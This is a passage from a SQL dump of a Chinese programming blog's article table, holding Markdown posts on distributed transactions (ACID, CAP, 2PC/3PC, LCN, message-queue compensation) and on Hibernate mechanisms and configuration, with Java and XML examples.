paymentInfo.setPayMessage(params.toString());\r\n			paymentInfo.setPlatformorderId(tradeNo);\r\n			\r\n			Integer updateResult = paymentInfoDao.updatePayInfo(paymentInfo); // 这里因为是本地事务可以回滚 \r\n			if (updateResult <= 0) {return \"fail\";}\r\n			// feign远程调用修改订单状态\r\n			JsonResult orderResult = orderServiceFeign.updateOrderId(1l, tradeNo, outTradeNo); // 这里无法回滚\r\n			if (orderResult.getCode() != 200) {				\r\n				// 失败了,需要回滚\r\n				// 需要事务回滚,分布式下需要分布式事务解决\r\n			}	\r\n			// 成功,支付宝接收后不会再重试了\r\n			return \"success\"; \r\n		} catch (Exception e) {\r\n			log.error(\"######PayCallBackServiceImpl##ERROR:#####\", e);			\r\n			// 失败,支付宝接收后会重试\r\n			return \"fail\";\r\n		} finally {\r\n			log.info(\"####异步回调service结束####params:\", params);\r\n		}\r\n	} \r\n```', 2, 2, 112, 0, 1, '2018-10-23 18:16:23', '2019-02-22 00:23:33', 0, 0);
INSERT INTO `article` VALUES (33, 1, '分布式事务', '2019/1/1546593152_67037CBC245AE4E31109E9F10CC508EA.jpg', '## 概念\n### 什么是数据库事务\n1. 是指作为单个逻辑工作单元执行的一系列操作，要么完全地执行，要么完全地不执行。 事务处理可以确保除非事务性单元内的所有操作都成功完成，否则不会永久更新面向数据的资源。\n2. 事务是一种保证数据一致性的做法\n\n### ACID理论\n1. 原子性: 要么全部执行,要求全部不执行,如果执行当中发生了错误,系统会回滚到最初的状态\n2. 一致性: 数据库的执行不会改变数据库中数据的一致性\n3. 隔离性: 两个以上的事务在执行过程中不会执行交错执行的状态,因为这样可能会导致数据的不一致\n4. 持久性: 事务执行成功之后,该事务对于事务的更改持久的保持在数据库当中\n\n### CAP理论\n1. 数据一致性: 数据一致\n2. 服务可用性: 节点非故障情况下应该响应,不能一直等待(降级,终止)\n3. 分区容错性: 某个节点发生故障也能满足数据一致性问题(可用,容错)\n\n### BASE理论 \n1. 最终一致性: 系统中所有数据副本经过一定时间后,最终能够达到一致的状态,不需要实时保证系统数据的一致性\n2. 基本可用 允许损失部分可用性,保证核心可用(降级)\n3. 软状态:允许系统不同节点同步过程中有中间状态存在耗时(MQ中体现)\n\n### 数据库事务问题\n1. 脏读: 是指在一个事务处理过程里读取了另一个未提交的事务中的数据。当一个事务正在多次修改某个数据,而在这个事务中这多次的修改都还未提交，这时一个并发的事务来访问该数据，就会造成两个事务得到的数据不一致。\n2. 不可重复读: 是指在对于数据库中的某个数据,一个事务范围内多次查询却返回了不同的数据值，这是由于在查询间隔,被另一个事务修改并提交了。\n3. 虚读(幻读): 幻读是事务非独立执行时发生的一种现象。例如事务T1对一个表中所有的行的某个数据项做了从“1”修改为“2”的操作,这时事务T2又对这个表中插入了一行数据项,而这个数据项的数值还是为“1”并且提交给数据库。而操作事务T1的用户如果再查看刚刚修改的数据,会发现还有一行没有修改,其实这行是从事务T2中添加的,就好像产生幻觉一样,这就是发生了幻读\n\n### 事务隔离级别\n1. Serializable(串行化): 可避免脏读、不可重复读、幻读的发生。\n2. RepeatableRead(可重复读): 可避免脏读、不可重复读的发生。(Mysql默认)\n3. ReadCommitted(读已提交): 可避免脏读的发生。(Oracle,SqlServer默认)\n4. ReadUncommitted(读未提交): 最低级别,任何情况都无法保证\n\n### 事务的传播行为\n#### 事务的传播行为是什么\n1. 执行事务的service业务层调用另一个service业务层所采用的策略\n\n#### Spring的事务传播策略\n1. ProPagation_required: 支持当前事务,如果不存在,就新建一个(默认)\n2. ProPagation_supports: 支持当前事务,如果不存在,就不使用使用\n3. ProPagation_mandatory: 支持当前事务,如果不存在,抛出异常\n4. ProPagation_requires_new: 如果有事务存在,挂起当前事务,创建一个新的事务\n5. ProPagation_not_supported: 以非事务方式运行,如果有事务存在,挂起当前事务\n6. ProPagation_never: 以非事务方式运行,如果有事务运行,抛出异常\n7. ProPagation_nested: 如果当前事务存在,则嵌套事务执行\n\n## 分布式事务\n### 什么是分布式事务问题\n![fenbushiwu.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1546606370_fenbushiwu.png)\n```java\n@Override\npublic void updateAll() {\n	// 修改本地\n	payDao.update(); // 本地数据库事务可以回滚\n	// 远程调用\n	orderServiceFeign.update(); // 无法回滚\n	int i = 1/0;// 报错了,需要回滚\n}\n```\n1. 服务接口与数据源不同,多数据源\n2. 发生异常时,如何回滚远程调用服务的事务\n\n### 如何解决分布式事务问题\n1. 2PC(二段提交)\n2. 3PC(三段提交,完善2PC)\n3. MQ(利用重试补偿,队列持久化保证最终一致性)\n\n### 3PC\n![fenbushishiwu3pc.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1546610092_fenbushishiwu3pc.png)\n\n### jta+Atomikos(基于2PC)\n![atomikos.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1546702227_atomikos.png)\n1. 本地解决多数据源事务所采用的方式,基于2PC\n2. 最为简单的解决方式,*但不适于大型微服务*\n\n### LCN框架\n![fenbushilcn.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1546663683_fenbushilcn.png)\n#### LCN实现原理\n1. LCN获取tm事务协调者注册地址\n2. LCN客户端项目启动的时候,读取配置文件tm事务协调者注册地址\n3. 向该事务协调者注册地址发送一个请求,获取对应的lcn底层协议ip和端口号(netty通讯)\n4. 会向该LCN底层协议ip和端口号建立长连接,保持会话信息\n\n#### LCN是什么\n1. 国人所作分布式事务框架,适用于微服务分布式\n2. 官网中有作者的原理详解视频 https://www.txlcn.org/v4/index.html\n3. *2019年1月14日,lcn更新了5.0版本,采用将基于springboot 2.0研发,将替换groupId传递机制，由sleuth机制处理,详情见GitHub https://github.com/codingapi/tx-lcn/releases*\n\n#### 其他分布式事务框架\n1. 阿里提出的TCC与GTS也可解决分布式事务问题,实现原理基于2PC\n2. 跨域语言如何解决分布式事务: 使用类似支付宝回调方式实现,通过可靠消息模式\n\n#### 分布式框架集群\n![transactional.png](http://blog.img.tuwq.cn/upload/artimg/2019/3/1553525110_transactional.png)\n1. 使用分布式事务框架有一个问题,那就如何宕机该怎么办\n2. 分布式框架大部分都支持集群,比如以Nginx作为中间件进行集群,做到主备容灾\n\n\n### 消息队列解决分布式事务\n![transactionalqueue.png](http://blog.img.tuwq.cn/upload/artimg/2019/3/1553523542_transactionalqueue.png)\n1. 利用消息队列进行*补单机制*,\n2. 将订单信息分发个两个队列及消费者,保证单个消费者宕机导致事务不一致 \n3. 该方案简单易实现,无需第三方框架实现,依靠保证最终一致性来达到实现', 2, 0, 107, 0, 0, '2018-10-23 20:37:05', '2019-03-25 22:46:59', 0, 0);
INSERT INTO `article` VALUES (34, 1, 'Hibernate重要机制与配置', '2018/10/1540803841_cf6559293a6421a155efc270a6b6b0e5.jpg', '# 前言 \r\n本文*不涉及框架用法*,只是用作记录重要的机制原理和配置\r\n***\r\n##### Hibernate是一个具有典型代表的*ORM框架*(表达数据模型对象映射关系)。  \r\n##### Hibernate框架体系功能十分强大 级联操作和懒加载的特性非常具有代表性。\r\n它自创了两种查询方式\r\n1. HQL: Hibernate称之为面向对象的查询语言,与数据表无关  \r\n2. Criteria: Hibernate自创查询,运用API进行数据库操作\r\n  \r\n### Hibernate缺点\r\n讲到Hibernate,就会提到MyBatis。经常有人会把二者进行比较,大部分人都是认为Mybatis简单又好用,Hibernate复杂又易出错,应该已经要淘汰了。 \r\n在我看来也是如此,Hibernate有很多不好的地方\r\n1. Hibernate和struct2一样有过度设计,笨重且难以整合第三方\r\n2. sql无法改变优化且很难控制,完全被Hibernate处理了,难以控制sql\r\n3. 晦涩又易出错的配置\r\n4. HQL多表复杂查询下不适用,Criteria只能在单表用用,原生sql结果封装在object[]数组中,需要自己准确封装,很麻烦\r\n\r\n经上述缺点,在即将到来的2019年之际,SSH框架不得不说过时了,struct2繁琐且需要编写配置文件,hibernate很多情况下放弃考虑.再加上新起的SpringCloud全套解决方案与大前端的进化,使得SSH确实已经过时了\r\n### Hibernate优点\r\n尽管如此hibernate也是有不错的优点\r\n1. 解决数据库迁移问题,比如从Mysql迁移到Oracle基本改改方言配置就可以了\r\n2. 后继出现的JPA是轻量级的解决方案,可以一用\r\n\r\n*** \r\n虽然SSH在当前时代潮流下地位很尴尬,但仍然有许多学校与老项目学习使用SSH,短时内不可能被替代\r\n\r\n## 对象状态\r\nHibernate*本质上操作的是持久化类的状态,而不是表面意义上的增删改查*\r\n### 持久化类创建注意事项\r\n- 持久化类提供*无参数构造*(Hibernate反射创建)\r\n- 成员变量私有提供*setget方法*(封装)\r\n- 持久化类中的属性,使用*包装类型*(Integer,Long)\r\n- 持久化类*必须提供id*,与数据库中主键列对应(hibernate区分对象是通过主键列id属性,而不是内存地址)\r\n- *不要用final修饰class*(hibernate实现动态代理是使用cglib继承代理)\r\n\r\n### 对象的状态\r\n持久化数据模型对象在Hibernate中有三种状态\r\n![hibernatestatus.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544848690_hibernatestatus.png) \r\n\r\n1. 瞬时状态: *没有id*,没有与session关联(没有在session缓存中) \r\n2. 持久化状态: 有id,与session有关联(在session缓存中)\r\n3. 游离|托管状态: 有id,没有与session关联(没有在session缓存中)\r\n\r\n看看代码来理解\r\n```java \r\n	// 三种状态\r\n	// 瞬时,持久化,游离|托管\r\n	// 三种状态转换\r\n	// 三种状态特点\r\n	// 持久化状态特点: 持久化对象的任何变化都会自动同步到数据库中,实际上不用update.事务提交后会进行更新\r\n	@org.junit.Test\r\n	public void fun1(){\r\n		Configuration conf = new Configuration();\r\n		conf.configure();\r\n		SessionFactory sessionFactory = conf.buildSessionFactory();\r\n		Session session = sessionFactory.openSession();\r\n		Transaction tx = session.beginTransaction();\r\n		//----------------------------------------------\r\n		Customer customer = new Customer(); // 没有id,没有session关联 => 瞬时状态\r\n		customer.setCust_name(\"google公司\");	 // 瞬时状态,依旧没有id,但有名字属性\r\n		session.save(customer); // 有id,与session有关联 => 持久化状态\r\n		Customer dbCustomer = session.get(Customer.class, 1l); // 有id,与session有关联 => 持久化状态\r\n		dbCustomer.setCust_name(\"微软公司\");	// 有id,与session有关联 => 持久化状态,实际上不用调用update\r\n		//----------------------------------------------\r\n		tx.commit();\r\n		session.close(); // 有id,没有与session关联 => 游离|托管状态\r\n		sessionFactory.close();\r\n	}\r\n\r\n```\r\n*Hibernate增删改查的本质就是对象状态转换*\r\n- save方法本质: 其实不能理解成保存.理解成将瞬时状态转换成持久状态的方法\r\n-  update方法本质: 其实不能理解成修改,理解成将游离状态转换成持久状态的方法\r\n- delete方法本质: 其实不能理解成删除,理解成将持久状态转换成瞬时状态 \r\n- get方法本质: 其实不能理解成查询,理解成直接获取持久状态\r\n- session.close方法本质: 将session关联剔除,理解成将持久状态转换成游离状态\r\n- saveOrUpdate方法本质: 其实不能理解成保存或修改,理解成将瞬时或游离状态转换成持久状态的方法\r\n\r\n## 缓存与快照\r\n缓存?缓存是用来干嘛的?\r\n1. 从硬件CPU来讲,CPU有多级缓存,CPU需要多级缓存的原因是为了*缓解CPU和内存之间速度不匹配问题*(查看我的第22篇文章笔记)\r\n2. 从软件发起IO请求文件下载来看, 预加载,解决硬盘多次交互,*制造缓冲区*而不是1字节1字节的读取\r\n3. 从Redis中来看,是为了快速获取数据,减轻数据库压力\r\n4. 总之,都是为了*提高效率*\r\n\r\nHibernate缓存也是为了提高效率,提高操作数据库的效率\r\n### 一级缓存\r\n```java\r\n	// 证明一级缓存存在\r\n	@org.junit.Test\r\n	public void fun1(){ \r\n		Configuration conf = new Configuration();\r\n		conf.configure();\r\n		SessionFactory sessionFactory = conf.buildSessionFactory();\r\n		Session session = sessionFactory.openSession();\r\n		Transaction tx = session.beginTransaction();\r\n		//----------------------------------------------\r\n		// 讲道理应该是打印五次SQL查询语句,但只打印了一次\r\n		Customer c1 = session.get(Customer.class, 1l);\r\n		Customer c2 = session.get(Customer.class, 1l);\r\n		Customer c3 = session.get(Customer.class, 1l);\r\n		Customer c4 = session.get(Customer.class, 1l);\r\n		Customer c5 = session.get(Customer.class, 1l);\r\n		System.out.println(c1==c2); // true\r\n		//----------------------------------------------\r\n		tx.commit();\r\n		session.close();\r\n		sessionFactory.close();\r\n	} \r\n```\r\n##### 明显5次得到Customer是同一个,也就是它被Hibernate的缓存装进去了。*调用get获取时得到对象是持久化状态,也就是被放入hibernate的session缓存中了*\r\n#### 一级缓存过程图\r\n![hibernatecache.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544848691_hibernatecache.png)\r\n\r\n与平常的缓存逻辑一致\r\n### 二级缓存\r\n##### 二级缓存是在session缓存之上的缓存,也就是*sessionFactory级别*,也就是说*多个session可以读取一个全局缓存*,二级缓存默认hibernate是不开启的  \r\n##### 只有很少被修改的数据,不会被并发访问的数据,常量数据适合放入二级缓存之中,*重要敏感数据*千万不要开启二级缓存,hibernate默认不开启二级缓存也是有道理的\r\n##### Redis类的分布式缓存出现使得二级缓存变得毫无卵用\r\n### 快照\r\n##### 快照是用以*存储某一时间的状态*,就像云服务商服务器提供的快照一样,为了能在误操作的情况下回滚至之前的状态,你也可以理解为游戏中的存档大法\r\n```java\r\n	// 证明快照存在\r\n	@org.junit.Test\r\n	public void fun2(){\r\n		Configuration conf = new Configuration();\r\n		conf.configure();\r\n		SessionFactory sessionFactory = conf.buildSessionFactory();\r\n		Session session = sessionFactory.openSession();\r\n		Transaction tx = session.beginTransaction();\r\n		//----------------------------------------------\r\n		// 假设数据库中原本id为1的cust_name就是阿里巴巴\r\n		// 最后改变依旧为阿里巴巴\r\n		// 不会打印执行update,因为hibernate发现CustName没有被修改,依旧是阿里巴巴\r\n		Customer c1 = session.get(Customer.class, 1l);\r\n		c1.setCust_name(\"百度\");\r\n		c1.setCust_name(\"腾讯\");\r\n		c1.setCust_name(\"阿里巴巴\");\r\n		//----------------------------------------------\r\n		tx.commit();\r\n		session.close();\r\n		sessionFactory.close();\r\n	}\r\n```\r\n##### 快照机制是用来比对的,*增加修改时的效率*,因为hibernate发现c1的cust_name取出来之前的cust_name就是阿里巴巴,尽管在修改三次后最后cust_name值依旧是阿里巴巴,事务提交时hibernate发现cust_name并没有改变,所以不会去执行update\r\n#### 快照过程图\r\n![hibernatephoto.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544848691_hibernatephoto.png)\r\n\r\n***\r\n#### 如果快照不存在,那么就会去update\r\n```java\r\n	// 如果快照不存在,那么就会去update\r\n	// 持久化状态对象其实就是放入session缓存中的对象\r\n	@org.junit.Test\r\n	public void fun3(){\r\n		Configuration conf = new Configuration();\r\n		conf.configure();\r\n		SessionFactory sessionFactory = conf.buildSessionFactory();\r\n		Session session = sessionFactory.openSession();\r\n		Transaction tx = session.beginTransaction();\r\n		//----------------------------------------------\r\n		Customer c1 = new Customer();\r\n		// 托管|游离.有id,没有与session关联(没有在session缓存中)\r\n		c1.setCust_id(1l); \r\n		// c1被放入session缓存了\r\n		session.update(c1); \r\n		// get会去从缓存中找,很明显上面把c1放入session变为持久化状态了\r\n		Customer c2 = session.get(Customer.class, 1l); \r\n		System.out.println(c1 == c2); // true\r\n		//----------------------------------------------\r\n		// 事务提交时,会比对缓存中的持久状态对象和快照\r\n		// 开始session缓存中没有快照,只有缓存中的c1缺少c1相关快照\r\n		// 根据c1的缓存,会执行一条update操作,对id=1的数据行进行修改\r\n		// 如果customer的数据表允许数据为空,那么事务提交后id为1的c1其他数据字段会被清空,因为执行了update\r\n		tx.commit(); \r\n		session.close();\r\n		sessionFactory.close();\r\n	} \r\n```\r\n## Hibernate事务\r\n事务的基本概念和隔离级别什么的肯定要知道\r\n### ACID定义\r\n1. 原子性: 要么全部执行,要求全部不执行,如果执行当中发生了错误,系统会回滚到最初的状态\r\n2. 一致性: 数据库的执行不会改变数据库中数据的一致性\r\n3. 隔离性: 两个以上的事务在执行过程中不会执行交错执行的状态,因为这样可能会导致数据的不一致\r\n4. 持久性: 事务执行成功之后,该事务对于事务的更改持久的保持在数据库当中\r\n\r\n### 数据库事务问题\r\n1. 脏读: 是指在一个事务处理过程里读取了另一个未提交的事务中的数据。当一个事务正在多次修改某个数据,而在这个事务中这多次的修改都还未提交，这时一个并发的事务来访问该数据，就会造成两个事务得到的数据不一致。\r\n2. 不可重复读: 是指在对于数据库中的某个数据,一个事务范围内多次查询却返回了不同的数据值，这是由于在查询间隔,被另一个事务修改并提交了。\r\n3. 虚读(幻读): 幻读是事务非独立执行时发生的一种现象。例如事务T1对一个表中所有的行的某个数据项做了从“1”修改为“2”的操作,这时事务T2又对这个表中插入了一行数据项,而这个数据项的数值还是为“1”并且提交给数据库。而操作事务T1的用户如果再查看刚刚修改的数据,会发现还有一行没有修改,其实这行是从事务T2中添加的,就好像产生幻觉一样,这就是发生了幻读\r\n\r\n### 事务隔离级别\r\n1. Serializable(串行化): 可避免脏读、不可重复读、幻读的发生。\r\n2. RepeatableRead(可重复读): 可避免脏读、不可重复读的发生。(Mysql默认)\r\n3. ReadCommitted(读已提交): 可避免脏读的发生。(Oracle,SqlServer默认)\r\n4. ReadUncommitted(读未提交): 最低级别,任何情况都无法保证\r\n\r\n### Hibernate如何管理事务\r\n1. 业务开始之前打开事务,业务执行之后提交事务,执行过程中出现异常,回滚事务\r\n2. 从数据层dao操作数据库需要用到session对象,在service控制事务也是使用session对象完成,\r\n	我们要确保dao层和service使用的是*同一个session*\r\n3. 在hibernate中,确保使用同一个session的问题,hibernate已经帮我们解决了(底层使用了线程封闭的ThreadLocal),开发人员只需要调用*sf.getCurrentSession()*方法即可获得与当前线程绑定的session对象\r\n4. 调用getCurrentSession方法必须配置主配置中的一个配置\r\n5. 通过getCurrentSession方法获得的session对象,当事务提交时,session会自动关闭,不要手动调用close关闭\r\n\r\n###### 大规模并发中不会开启事务,因为严重影响性能,而是会选择做*补偿方案*\r\n### hibernate开启事务与ThreadLoacal的Session\r\n```xml\r\n<property name=\"hibernate.connection.isolation\">4</property>\r\n<!-- 之所以以数字区分,是因为数据库直接以二进制区分事务等级 -->\r\n1: 0001 读未提交\r\n2: 0010 读已提交\r\n4: 0100 可重复读\r\n8: 1000 串行化\r\n<!-- 指定session与当前线程绑定 -->\r\n<property name=\"hibernate.current_session_context_class\">thread</property>\r\n```\r\n\r\n## 查询优化\r\n### Hibernate的查询的种类\r\n#### HQL查询\r\n1. HibernateQueryLanguage\r\n2. hibernate独家查询语言,属于面向对象查询语言,对象查询,依靠对象属性进行多表查询\r\n3. HQL语句中,不可能出现任何数据库相关信息的\r\n4. 只可能出现对象名和属性名,支持问号占位符和命名占位符\r\n5. 多表查询但不复杂时使用\r\n#### Criteria查询\r\n1. hibernate自创无语句面向对象查询\r\n2. 单表查询使用\r\n3. 传统criteria 由session创建,组装查询条件到Criteria执行查询\r\n4. 离线Criteria 不需要session凭空创建Criteria,组装查询条件\r\n#### 原生SQL查询 \r\n1. 复杂的业务查询(十表关联报表的查询)\r\n2. 支持问号占位符和命名占位符\r\n\r\n### 类级别懒加载\r\nHibernate的load方法实现了懒加载,在使用时才进行查询  \r\n懒加载默认所有数据持久化类都是开启的\r\n```xml\r\n<!-- lazy: load懒加载 -->\r\n<class name=\"Customer\" table=\"cst_customer\" lazy=\"ture\" >\r\n``` \r\n```java\r\n	// get方法: 立即加载,执行方法时立即发送sql语句查询结果\r\n	@org.junit.Test\r\n	public void fun1() {\r\n		Session session = HibernateUtils.getCurrentSession();\r\n		Transaction tx = session.beginTransaction();\r\n		//----------------------------------------------------\r\n		Customer c = session.get(Customer.class, 2l);\r\n		System.out.println(c);\r\n		//----------------------------------------------------\r\n		tx.commit();\r\n	}\r\n	\r\n	// load方法: 是在执行时,不发送任何sql语句,返回一个对象,使用该对象时,才执行查询\r\n	// 延迟加载:仅仅获得没有使用,不会查询,在使用时才进行查询\r\n	@org.junit.Test\r\n	public void fun2() {\r\n		Session session = HibernateUtils.getCurrentSession();\r\n		Transaction tx = session.beginTransaction();\r\n		//----------------------------------------------------\r\n		Customer c = session.load(Customer.class, 2l);\r\n		System.out.println(c);\r\n		//----------------------------------------------------\r\n		tx.commit();\r\n	} \r\n```\r\n### 关联级别懒加载和fetch\r\n#### 集合级别,一方获取多方\r\n```xml\r\n<set name=\"linkMens\" lazy=\"true\" fetch=\"select\" batch-size=\"3\"  >\r\n	<key column=\"lkm_cust_id\" ></key>\r\n	<one-to-many class=\"LinkMan\" />\r\n</set> \r\n<!-- lazy属性: 决定是否延迟加载 -->\r\ntrue(默认值): 延迟加载,懒加载 (是在执行时,不发送任何sql语句,返回一个代理对象,使用该对象时,运用session才执行查询,延迟加载(hibernate使用代理实现的))\r\nfalse: 立即加载\r\nextra: 极其懒惰,与懒加载基本一致,如果只获得集合size,只查询集合的size(count)语句\r\n<!-- fetch属性: 决定加载策略.使用什么类型的sql语句加载集合数据 -->\r\nselect(默认值): 单表查询加载\r\njoin: 使用多表查询加载集合\r\nsubselect:使用子查询加载集合\r\n两个属性可以组成九种组合,造成7种查询SQL结果,多表查询会导致懒加载失效 \r\n<!-- batch-size: 抓取集合的数量为3 -->\r\n抓取客户的集合时,一次抓取几个客户的联系人集合.\r\n```\r\n#### 关联级别,多方获取一方\r\n```xml\r\n<many-to-one name=\"customer\" column=\"lkm_cust_id\" class=\"Customer\" fetch=\"join\" lazy=\"proxy\"  >\r\n</many-to-one> \r\n<!-- lazy  决定加载时机 -->\r\nfalse: 立即加载\r\nproxy: 由另一方的*类级别*加载策略决定\r\n<!-- fetch 决定加载的sql语句 -->\r\nselect: 使用单表查询\r\njoin : 多表查询\r\n```\r\n### 懒加载策略\r\n1. 为了提高效率,fetch的选择上应该选择select,lazy的取值应选择true。全部使用默认值\r\n2. 懒加载后却未使用的情况下,会导致在页面上实现懒加载时的代理对象,被称为no-session问题,因为显示至页面后hibernate的session关闭了,而懒加载的数据期间没有被使用.解决方法是在filter放行后扩大session的作用范围,页面使用代理对象渲染后再关闭session\r\n\r\n## 关系映射绑定\r\n### 一对多\r\n#### 一方Customer\r\n```java\r\nprivate Set<LinkMan> linkMans = new HashSet<LinkMan>();\r\n``` \r\n```xml\r\n<!-- 一对多关系 \r\n	name: 引用属性名\r\n	column: 外键列名\r\n	class: 关联对象类名\r\n-->\r\n<!-- 级联操作: cascade \r\n	save-update: 级联保存更新\r\n	delete: 级联删除\r\n	all: save-upad+delete都启用\r\n	级联操作: 简化操作,语法糖,无需每个单个保存或删除\r\n-->\r\n<!-- \r\n	inverse属性: 配置关系是否维护\r\n	true: 不维护关系\r\n	false: 维护关系\r\n	性能优化提高关系维护性能.\r\n	一对多关系中: 由多的一方维护,外键字段就在多的一方的列\r\n--> \r\n<set name=\"linkMans\" inverse=\"true\" cascade=\"save-update\">\r\n	<!-- 外键名 -->\r\n	<key column=\"lkm_cust_id\"></key>\r\n	<!-- 一对多 多者类 -->\r\n	<one-to-many class=\"LinkMan\"/>\r\n</set> \r\n```\r\n#### 多方LinkMan\r\n```java\r\nprivate Customer customer ;\r\n``` \r\n```xml\r\n<!--多对一关系  \r\n	name: 引用属性名\r\n	column: 外键列名		\r\n	class: 关联对象类名\r\n--> \r\n<!-- 级联操作: cascade \r\n	save-update: 级联保存更新\r\n	delete: 级联删除\r\n	all: save-upad+delete都启用\r\n	级联操作: 简化操作,语法糖,无需每个单个保存或删除\r\n-->\r\n<!-- 多的一方:不能放弃维护关系,外键字段就在多的一方的列 -->\r\n<many-to-one name=\"customer\" column=\"lkm_cust_id\" class=\"Customer\"/>\r\n```\r\n### 多对多\r\n#### 多对多关系,一定要选择一方放弃维护关系\r\n#### 多方Role\r\n ```java\r\nprivate Set<User> users = new HashSet<User>();\r\n```\r\n```xml\r\n<!-- 使用inverse属性\r\n	true: 放弃维护外键关系\r\n	false(默认值):维护关系\r\n	结论: 将来在开发中,如果遇到多对多关系.一定要选择一方放弃维护关系.\r\n	一般谁来放弃要看业务方向. 例如录入员工时,需要为员工指定所属角色.\r\n	 那么业务方向就是由员工维护角色. 角色不需要维护与员工关系.角色放弃维护\r\n-->\r\n<set name=\"users\" table=\"sys_user_role\" inverse=\"true\" >\r\n	<key column=\"role_id\" ></key>\r\n	<many-to-many class=\"User\" column=\"user_id\" ></many-to-many>\r\n</set>\r\n```\r\n#### 多方User\r\n```java\r\nprivate Set<Role> roles = new HashSet<Role>();\r\n```\r\n```xml\r\n<!-- 多对多关系表达\r\n	name: 引用属性名\r\n	column: 外键列名\r\n	class: 关联对象类名\r\n-->\r\n<!-- 级联操作: cascade \r\n	save-update: 级联保存更新\r\n	delete: 级联删除\r\n	all: save-upad+delete都启用\r\n	级联操作: 简化操作,语法糖,无需每个单个保存或删除\r\n-->\r\n<set name=\"roles\" table=\"sys_user_role\" cascade=\"save-update\" >\r\n	<key column=\"user_id\" ></key>\r\n	<many-to-many class=\"Role\" column=\"role_id\" ></many-to-many>\r\n</set>\r\n``` \r\n# 总结重要配置属性\r\n#### 生成表结构 \r\n```xml\r\n<property name=\"hibernate.hbm2ddl.auto\">update</property>\r\n1. create		自动建表.每次框架运行都会创建新的表.以前表将会被覆盖,表数据会丢失.(开发环境中测试使用)\r\n2. create-drop 自动建表.每次框架运行结束都会将所有表删除.(开发环境中测试使用)\r\n3. update(推荐使用) 自动生成表.如果已经存在不会再生成.如果表有变动.自动更新表(不会删除任何数据)\r\n4. validate	校验.不自动生成表.每次启动会校验数据库中表是否正确.校验失败 \r\n```\r\n#### 语句方言(Mysql)\r\n```xml\r\n<property name=\"hibernate.dialect\">org.hibernate.dialect.MySQLDialect</property>\r\norg.hibernate.dialect.MySQLDialect 通用型(推荐)\r\norg.hibernate.dialect.MySQLInnoDBDialect	InnoDB引擎\r\norg.hibernate.dialect.MySQLMyISAMDialect	ISAMD引擎\r\n```\r\n#### 事务隔离级别\r\n```xml\r\n<property name=\"hibernate.connection.isolation\">4</property>\r\n1: 0001 读未提交\r\n2: 0010 读已提交\r\n4: 0100 可重复读\r\n8: 1000 串行化\r\n```\r\n#### 开启线程级别session\r\n```xml\r\n<property name=\"hibernate.current_session_context_class\">thread</property>\r\n```\r\n#### 主键类型\r\n*了解一下什么叫自然主键和代理主键*\r\n1. 自然主键(表的业务列中,有某业务列符合必须有,并且不重复的特征时(身份证号码),该列可以作为主键使用)\r\n2. 代理主键(表的业务列中,没有业务列符合必须有,并且不重复的特征时,创建一个没有业务意义的列,作为主键)\r\n\r\n#### 主键生成策略\r\n```xml\r\n<id name=\"cust_id\"  >\r\n	<!-- generator:主键生成策略 -->\r\n	<generator class=\"native\"></generator>\r\n</id>\r\nidentity 主键自增,由数据库维护主键值,录入时不需要指定主键id\r\nincrement(不用) 主键自增,由hibernate来维护,每次插入前先查询表中id最大值,+1作为新主键值(有线程安全问题)\r\nsequence: Oracle中的主键生成策略\r\nhilo(不用): 高低位算法.主键自增,由hibernate维护保证不重复\r\nnative: hilo+increment+identity,自动三选一策略\r\nuuid: 产生随机字符串作为主键,主键类型必须是string\r\nassigned: 自然主键生成策略,hibernate不会管理主键值,由开发人员自己录入\r\n```\r\n#### 级联操作\r\n```xml\r\n<!-- 级联操作: cascade -->\r\n save-update: 级联保存更新\r\n delete: 级联删除\r\n all: save-upad+delete都启用\r\n 级联操作: 简化操作,语法糖,无需每个单个保存或删除\r\n```\r\n#### 配置关系是否维护\r\n```xml\r\n<!-- 配置关系是否维护: inverse -->\r\n true: 不维护关系\r\n false: 维护关系\r\n 性能优化提高关系维护性能.\r\n 一对多关系中: 由多的一方维护,外键字段就在多的一方的列\r\n```\r\n#### 持久化类懒加载\r\n```xml\r\n<!-- lazy: load懒加载 -->\r\n<class name=\"Customer\" table=\"cst_customer\" lazy=\"ture\" >\r\n``` \r\n#### 关联级别懒加载-多方\r\n```xml\r\n<!-- \r\nfetch 决定加载的sql语句\r\n	select: 使用单表查询\r\n	join : 多表查询\r\nlazy  决定加载时机\r\n	false: 立即加载\r\n	proxy: 由customer的类级别加载策略决定.\r\n--> \r\n<many-to-one name=\"customer\" column=\"lkm_cust_id\" class=\"Customer\" fetch=\"select\" lazy=\"proxy\"  >\r\n</many-to-one>\r\n```\r\n#### 关联级别懒加载-一方\r\n```xml\r\n<!-- \r\nlazy属性: 决定是否延迟加载\r\n	true(默认值): 延迟加载,懒加载\r\n	false: 立即加载\r\n	extra: 极其懒惰\r\nfetch属性: 决定加载策略.使用什么类型的sql语句加载集合数据\r\n	select(默认值): 单表查询加载\r\n	join: 使用多表查询加载集合\r\n	subselect:使用子查询加载集合\r\nbatch-size属性: 抓取集合的数量为3.\r\n	抓取客户的集合时,一次抓取几个客户的联系人集合.\r\n -->  \r\n<set name=\"linkMens\" lazy=\"true\" fetch=\"select\" batch-size=\"3\"  >\r\n	<key column=\"lkm_cust_id\" ></key>\r\n	<one-to-many class=\"LinkMan\" />\r\n</set>\r\n```', 0, 0, 105, 0, 0, '2018-10-29 17:04:13', '2019-02-22 00:24:26', 0, 0);
